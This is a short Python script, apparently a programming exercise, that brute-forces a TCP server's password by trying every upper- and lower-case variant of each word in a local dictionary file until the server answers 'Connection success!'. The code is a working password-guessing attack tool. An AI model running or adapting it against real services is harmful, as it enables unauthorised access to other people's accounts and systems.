import argparse
import socket
import itertools
import string
import os

parser = argparse.ArgumentParser(description="suppa hackka")
parser.add_argument('ip',  help='ip address', type=str)
parser.add_argument('port',  help='port', type=int)
args = parser.parse_args()

client = socket.socket()
client.connect((args.ip, args.port))


def send_response(msg: str):
    """accepts message as arg, sends it to server, returns server message"""
    client.send(msg.encode())
    return client.recv(1024).decode()


with open(r"C:\down\passwords.txt", "r") as f:
    passwds = [x.replace('\n', '') for x in f.readlines()]

found = None
for p in passwds:
    if found: break
    possible = [[letter.lower(), letter.upper()] for letter in p]
    iter_obj = itertools.product(*possible)
    try:
        while True:
            passwd = ''.join(next(iter_obj))
            if send_response(passwd) == 'Connection success!':
                found = True
                print(passwd)
                break
    except StopIteration: pass
'''
for each password in dictionary:
    create itertools combination iter object
        the combinations are of current_password.lower() and current_password.upper()
    try:
        while True:
            send password next(iter)
            if works: print,break while loop and for loop both
    except StopIteration
-----

itertools.combinations(upper+lower, len(p)) checks ever possible 
arrangement of of upper case and lower case letters of password, that's not what is needed here
we need to check every possible case of the password

so password
passworD
passwoRD

abc
abC
aBc
aBC
Abc
AbC
ABc
ABC
'''

client.close()
